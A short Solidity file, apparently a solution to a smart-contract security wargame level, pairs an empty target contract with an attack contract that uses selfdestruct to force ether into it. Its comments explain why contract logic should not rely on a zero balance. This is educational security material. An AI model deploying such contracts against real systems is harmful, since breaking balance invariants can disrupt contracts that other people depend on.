// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

// However, there is no way to stop an attacker from sending ether to a contract by self destroying. 
// Hence, it is important not to count on the invariant address(this).balance == 0 for any contract logic.
// by using selfdestruct, attack can forcefully send ether to another contract to disrupt the contract logic.
contract ForcefullySendEther {
    receive() external payable {
        // fallback function receive ether so that we can use this contract to forcefully send ether to another contract
    }
    function get_balance() public view returns (uint256) {
      return address(this).balance;
    }
    
  function receive_and_suicide(address payable target) payable public {
    selfdestruct(target);
  }
}
